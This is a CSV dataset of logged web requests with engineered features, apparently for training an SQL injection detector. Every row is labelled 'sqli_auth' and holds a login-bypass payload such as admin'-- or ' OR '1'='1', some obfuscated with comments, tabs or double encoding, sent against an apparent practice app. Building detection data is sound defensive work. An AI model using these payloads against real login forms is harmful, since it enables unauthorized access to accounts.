url_length,path_length,query_length,body_length,is_json_payload,json_depth,param_count_body,number_of_parameters,parameter_name_count,encoded_character_count,percent_encoded_count,single_quote_count,double_quote_count,semicolon_count,comma_count,parenthesis_count,dash_count,hash_count,asterisk_count,slash_count,equal_count,plus_count,whitespace_count,keyword_select,keyword_union,keyword_from,keyword_where,keyword_or,keyword_and,keyword_insert,keyword_update,keyword_delete,keyword_drop,keyword_alter,keyword_create,keyword_table,keyword_information_schema,keyword_sleep,keyword_benchmark,keyword_version,has_union_select,has_tautology,has_sql_comment,has_quote,has_subquery,has_information_schema,has_sleep,has_benchmark,has_if_function,has_case_when,has_exists,has_substring,has_ascii,has_length,has_database_function,has_version_function,has_system_variable,has_error_based_pattern,has_error_condition,nested_select_count,sql_function_count,comparison_count,logical_operator_count,method_get,method_post,status_code,is_error_response,response_size,response_time,ip_request_count,ip_unique_path_count,ip_unique_query_count,text,ip,timestamp,method,url,path,query,decoded_query,attack_type,label,label_source,request_hash
133,22,110,0,0,0,0,0,0,26,26,5,0,1,0,0,3,0,8,11,3,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,4326,0,13115,10,6928,username=admin'/**/OR/**/'1'='1'/**/;--/**/-&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-%26password%3Dpass,/vulnerabilities/sqli/,username%3Dadmin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-%26password%3Dpass,username=admin'/**/OR/**/'1'='1'/**/;--/**/-&password=pass,sqli_auth,1,existing_log_label,47ccd58433ac3a19139ebac1c2b908bd
106,22,83,0,0,0,0,0,0,19,19,0,10,0,0,0,2,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,2931,0,13115,10,6928,"username=""	OR	""1""=""1""&password=""	Or	""1""=""1""--",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%22%09OR%09%221%22%3D%221%22%26password%3D%22%09Or%09%221%22%3D%221%22--,/vulnerabilities/sqli/,username%3D%22%09OR%09%221%22%3D%221%22%26password%3D%22%09Or%09%221%22%3D%221%22--,"username=""	OR	""1""=""1""&password=""	Or	""1""=""1""--",sqli_auth,1,existing_log_label,2aa1bc925873372a9f27cde86189e51a
11,11,0,162,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,200,0,3885,0,13115,10,6928,username%3Dadmin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-%26password%3Dpass,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,aac29a9f823c56c5ffd50d3cb2de9939
61,22,24,0,0,0,0,1,8,3,3,1,0,0,0,0,0,0,0,3,2,0,3,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1045,1,13115,10,6928,username=' OR 1=1,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='%20OR%201=1%20#&password=123,/vulnerabilities/sqli/,username='%20OR%201=1%20,username=' OR 1=1 ,sqli_auth,1,existing_log_label,f378a867b79d4c81a1e3b0c97ba5d016
69,22,46,0,0,0,0,0,0,5,5,1,0,1,0,0,3,0,0,3,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,2859,0,13115,10,6928,username=' OR 1=1 ;-- -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27 OR 1%3D1+%3B--+-&password%3D123,/vulnerabilities/sqli/,username%3D%27 OR 1%3D1+%3B--+-&password%3D123,username=' OR 1=1 ;-- -&password=123,sqli_auth,1,existing_log_label,45865edcad7be2c56304839647f7a469
94,22,71,0,0,0,0,0,0,14,14,5,0,0,0,0,0,0,1,4,3,3,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,3900,1,13115,10,6928,username=admin'+OR+'1'='1'+/*&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27%2BOR%2B%271%27%3D%271%27%2B%2F%2A%26password%3Dpass,/vulnerabilities/sqli/,username%3Dadmin%27%2BOR%2B%271%27%3D%271%27%2B%2F%2A%26password%3Dpass,username=admin'+OR+'1'='1'+/*&password=pass,sqli_auth,1,existing_log_label,e09f2e19bd2298c83dbb5de45f25b30a
66,22,43,0,0,0,0,1,15,5,5,1,0,0,0,0,0,0,1,4,3,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,1296,1,13115,10,6928,username=' OR 1=1 /*&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27 OR 1=1+%2F%2A&password%3D123,/vulnerabilities/sqli/,username%3D%27 OR 1=1+%2F%2A&password%3D123,username=' OR 1=1 /*&password=123,sqli_auth,1,existing_log_label,45c2cf089d6f59cc57c46a7dd0f9054a
73,22,50,0,0,0,0,0,0,9,9,1,0,0,0,0,0,1,0,3,3,3,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,4283,1,13115,10,6928,username='+OR+1=1+#&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27%2BOR%2B1%3D1%2B%23%26password%3D123,/vulnerabilities/sqli/,username%3D%27%2BOR%2B1%3D1%2B%23%26password%3D123,username='+OR+1=1+#&password=123,sqli_auth,1,existing_log_label,aebad91b10b6ac6d586bea7fa05ce9f3
58,22,35,0,0,0,0,2,16,0,0,1,0,0,0,0,2,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1893,0,13115,10,6928,username=admin'--&password=anything,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin'--&password=anything,/vulnerabilities/sqli/,username=admin'--&password=anything,username=admin'--&password=anything,sqli_auth,1,existing_log_label,526d7d2dd72e187f9fb7eab1823c926c
10,10,0,41,0,0,0,0,0,0,0,1,0,0,0,0,3,0,0,1,2,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,200,0,3303,0,13115,10,6928,username=admin' -- -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_auth,1,existing_log_label,c9fe61edb8914745a88890e2e5db369f
82,22,59,0,0,0,0,0,0,8,8,10,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,1264,1,13115,10,6928,username=' OR '1'='1'&password=' OR '1'='1',192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D' OR %271'%3D%271'&password%3D%27 OR %271'%3D'1',/vulnerabilities/sqli/,username%3D' OR %271'%3D%271'&password%3D%27 OR %271'%3D'1',username=' OR '1'='1'&password=' OR '1'='1',sqli_auth,1,existing_log_label,7010a319d63bd0be10c722bdbe5300d4
60,22,37,0,0,0,0,2,16,0,0,1,0,0,0,0,2,0,1,4,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,3459,1,13115,10,6928,username=admin'--&password=anything/*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin'--&password=anything/*,/vulnerabilities/sqli/,username=admin'--&password=anything/*,username=admin'--&password=anything/*,sqli_auth,1,existing_log_label,510dcc18f0984a5f91b04c6db6d1bb65
11,11,0,74,0,0,0,0,0,0,0,5,0,1,0,0,3,0,0,1,3,0,6,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,2093,0,13115,10,6928,username=admin'	OR	'1'='1'	;--	-&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,b60af415165eaaa7d0de0f0f5494695b
66,22,43,0,0,0,0,0,0,4,4,1,0,0,0,0,2,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1203,0,13115,10,6928,username=admin'--&password=anything,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27--%26password%3Danything,/vulnerabilities/sqli/,username%3Dadmin%27--%26password%3Danything,username=admin'--&password=anything,sqli_auth,1,existing_log_label,526d7d2dd72e187f9fb7eab1823c926c
59,22,36,0,0,0,0,1,8,1,1,1,0,1,0,0,3,0,0,3,2,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1407,0,13115,10,6928,username=admin' ;-- -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin'+;--+-&password=123,/vulnerabilities/sqli/,username%3Dadmin'+;--+-&password=123,username=admin' ;-- -&password=123,sqli_auth,1,existing_log_label,5bcaf553514e7e93689853a51f13a885
11,11,0,32,0,0,2,0,0,0,0,1,0,0,0,0,0,1,0,1,2,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,200,0,918,0,13115,10,6928,username=admin' #&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,88d618b848df8b7b18f66eeb763bed92
101,22,78,0,0,0,0,2,8,6,6,0,0,0,0,0,2,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,4348,0,13115,10,6928,id=username%3Dadmin%27--%26password%3Danything%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253Dadmin%2527--%2526password%253Danything%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=username%253Dadmin%2527--%2526password%253Danything%252F%252A&Submit=Submit,id=username%3Dadmin%27--%26password%3Danything%2F%2A&Submit=Submit,sqli_auth,1,existing_log_label,0fd873d15bd1468661270b46f9ac5c1d
28,28,0,66,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,200,0,2012,0,13115,10,6928,username%3Dadmin%27%2520%3B--%2520-%26password%3D123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,,sqli_auth,1,existing_log_label,766567595cc51ef2800f9f56be45d5f2
28,28,0,44,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,3,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,2625,0,13115,10,6928,username=' OR 1=1 #&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,,sqli_auth,1,existing_log_label,8b08ca24db86ca10387f04a21697ee74
66,22,43,0,0,0,0,2,16,0,0,10,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,4389,1,13115,10,6928,username=' Or '1'='1'&password=' Or '1'='1',192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='+Or+'1'='1'&password='+Or+'1'='1',/vulnerabilities/sqli/,username='+Or+'1'='1'&password='+Or+'1'='1',username=' Or '1'='1'&password=' Or '1'='1',sqli_auth,1,existing_log_label,a892ef33b4555b75058c64aaacda0f7f
96,22,73,0,0,0,0,2,8,6,6,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,2998,0,13115,10,6928,id=username%3Dadmin%27%09%2523%26password%3D123&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253Dadmin%2527%2509%252523%2526password%253D123&Submit=Submit,/vulnerabilities/sqli/,id=username%253Dadmin%2527%2509%252523%2526password%253D123&Submit=Submit,id=username%3Dadmin%27%09%2523%26password%3D123&Submit=Submit,sqli_auth,1,existing_log_label,4128bc8cf24bd65e0ce5d89476097c19
80,22,57,0,0,0,0,0,0,7,7,5,0,0,0,0,2,0,0,3,3,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,3666,1,13115,10,6928,username=admin' OR '1'='1' --&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27 OR %271%27%3D'1%27 --&password%3Dpass,/vulnerabilities/sqli/,username%3Dadmin%27 OR %271%27%3D'1%27 --&password%3Dpass,username=admin' OR '1'='1' --&password=pass,sqli_auth,1,existing_log_label,93d31f375d68ab40fcbbf16bab4ab7fc
69,22,46,0,0,0,0,0,0,5,5,1,0,1,0,0,3,0,0,3,2,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1571,0,13115,10,6928,username=admin'  ;--  -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27++%3B--++-%26password%3D123,/vulnerabilities/sqli/,username%3Dadmin%27++%3B--++-%26password%3D123,username=admin'  ;--  -&password=123,sqli_auth,1,existing_log_label,b2735d1819530c41dd966c8760539f05
11,11,0,81,0,0,0,0,0,0,0,10,0,0,0,0,0,0,0,1,4,4,2,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,1,200,0,3072,0,13115,10,6928,username='+Or+'1'='1'&password='+or+'1'='1',192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,e899d516048ab5465d9bfba54e8ba8f8
10,10,0,121,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,4,2,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,200,0,4294,0,13115,10,6928,username%3D%27+OR+%271%27%3D%271%27%26password%3D%27+OR+%271%27%3D%271%27%2F%2A,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_auth,1,existing_log_label,2713ac27ebfe3f2662a49bec4748ca65
68,22,45,0,0,0,0,2,16,0,0,5,0,0,0,0,3,0,0,3,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,2953,0,13115,10,6928,username=admin' or '1'='1' -- -&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin' or '1'='1' -- -&password=pass,/vulnerabilities/sqli/,username=admin' or '1'='1' -- -&password=pass,username=admin' or '1'='1' -- -&password=pass,sqli_auth,1,existing_log_label,fb9aa2408827769b7925097effd7af33
22,22,0,66,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,200,0,2636,0,13115,10,6928,username%3Dadmin%27%2F%2A%2A%2F--%26password%3D123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_auth,1,existing_log_label,8a3fa6be0cbb282b484b14094f252774
76,22,53,0,0,0,0,1,8,7,7,8,0,0,0,0,2,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,1466,0,13115,10,6928,username=' OR ''='&password=' OR ''='--,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27 OR '%27%3D'&password=' OR '%27%3D%27--,/vulnerabilities/sqli/,username%3D%27 OR '%27%3D'&password=' OR '%27%3D%27--,username=' OR ''='&password=' OR ''='--,sqli_auth,1,existing_log_label,5bab054ec2f4ad0e008baf1bf76447fa
76,22,53,0,0,0,0,2,16,4,4,10,0,0,0,0,2,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,852,0,13115,10,6928,username=' OR '1'='1'&password=' oR '1'='1'--,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='%20OR%20'1'='1'&password='%20oR%20'1'='1'--,/vulnerabilities/sqli/,username='%20OR%20'1'='1'&password='%20oR%20'1'='1'--,username=' OR '1'='1'&password=' oR '1'='1'--,sqli_auth,1,existing_log_label,e3d54dafe5c0da83387582f695c99a05
11,11,0,37,0,0,2,0,0,0,0,1,0,0,0,0,3,0,0,1,3,0,6,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,861,0,13115,10,6928,username=' OR 1=1 -- -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,85cc07c1f66d519c68d7fa8133be467a
86,22,63,0,0,0,0,0,0,9,9,5,0,0,0,0,3,0,0,3,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,940,0,13115,10,6928,username=admin' OR '1'='1' -- -&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27+OR+%271%27%3D%271%27+--+-%26password%3Dpass,/vulnerabilities/sqli/,username%3Dadmin%27+OR+%271%27%3D%271%27+--+-%26password%3Dpass,username=admin' OR '1'='1' -- -&password=pass,sqli_auth,1,existing_log_label,60504f6f88590488916afeaa2503f057
62,22,39,0,0,0,0,2,16,0,0,8,0,0,0,0,0,0,1,4,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,1328,0,13115,10,6928,username=' OR ''='&password=' OR ''='/*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=' OR ''='&password=' OR ''='/*,/vulnerabilities/sqli/,username=' OR ''='&password=' OR ''='/*,username=' OR ''='&password=' OR ''='/*,sqli_auth,1,existing_log_label,ad8aefb74a28945f71cf06841179b204
22,22,0,37,0,0,2,0,0,0,0,1,0,0,0,0,3,0,0,3,3,0,6,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,1999,0,13115,10,6928,username=' Or 1=1 -- -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_auth,1,existing_log_label,17ea4c32513d52174ae39ac0fe64c6e7
96,22,73,0,0,0,0,0,0,15,15,10,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,3848,0,13115,10,6928,username=' or '1'='1'&password=' oR '1'='1',192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27+or+%271%27%3D%271%27%26password%3D%27+oR+%271%27%3D%271%27,/vulnerabilities/sqli/,username%3D%27+or+%271%27%3D%271%27%26password%3D%27+oR+%271%27%3D%271%27,username=' or '1'='1'&password=' oR '1'='1',sqli_auth,1,existing_log_label,c525cc1a51df235e3574f63ddae54d34
93,22,70,0,0,0,0,0,0,14,14,8,0,1,0,0,3,0,0,3,4,0,6,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,3964,0,13115,10,6928,username=' Or ''='&password=' OR ''=';-- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27+Or+%27%27%3D%27%26password%3D%27+OR+%27%27%3D%27%3B--+-,/vulnerabilities/sqli/,username%3D%27+Or+%27%27%3D%27%26password%3D%27+OR+%27%27%3D%27%3B--+-,username=' Or ''='&password=' OR ''=';-- -,sqli_auth,1,existing_log_label,72cdb8bdf5d76a5ddccf6cfac74ff740
28,28,0,83,0,0,0,0,0,0,0,0,10,0,0,0,2,0,0,3,4,4,2,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,1,200,0,2332,1,13115,10,6928,"username=""+OR+""1""=""1""&password=""+OR+""1""=""1""--",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,,sqli_auth,1,existing_log_label,0f48cabce5c198dec776c1956cdf143f
11,11,0,49,0,0,2,0,0,0,0,5,0,0,0,0,2,0,0,1,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,4402,1,13115,10,6928,username=admin' Or '1'='1' --&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,87f6a87da35d4f817d8965e30c25269e
134,22,111,0,0,0,0,2,8,14,14,0,0,0,0,0,3,0,0,3,2,4,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3135,1,13115,10,6928,id=username%3Dadmin%27+OR+%271%27%3D%271%27+%3B--+-%26password%3Dpass&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B%253B--%2B-%2526password%253Dpass&Submit=Submit,/vulnerabilities/sqli/,id=username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B%253B--%2B-%2526password%253Dpass&Submit=Submit,id=username%3Dadmin%27+OR+%271%27%3D%271%27+%3B--+-%26password%3Dpass&Submit=Submit,sqli_auth,1,existing_log_label,db767a4ee62490ec49e8530aa47582c1
91,22,68,0,0,0,0,0,0,10,10,5,0,0,0,0,0,1,0,3,3,0,10,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,3652,1,13115,10,6928,username=admin'   OR   '1'='1'   #&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27+++OR+++%271%27%3D%271%27+++%23%26password%3Dpass,/vulnerabilities/sqli/,username%3Dadmin%27+++OR+++%271%27%3D%271%27+++%23%26password%3Dpass,username=admin'   OR   '1'='1'   #&password=pass,sqli_auth,1,existing_log_label,c0374793437c26d5fe0bf1f58d7ceb09
11,11,0,70,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,1,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,1226,1,13115,10,6928,username=admin'	or	'1'='1'	%23&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,b2b590f96abcf4673825af82717ae1dc
63,22,40,0,0,0,0,1,8,2,2,1,0,0,0,0,2,1,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,2667,1,13115,10,6928,username=admin'--&password=anything#,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin'--&password%3Danything%23,/vulnerabilities/sqli/,username=admin'--&password%3Danything%23,username=admin'--&password=anything#,sqli_auth,1,existing_log_label,dcacce870d91f1646fb213e961ba114a
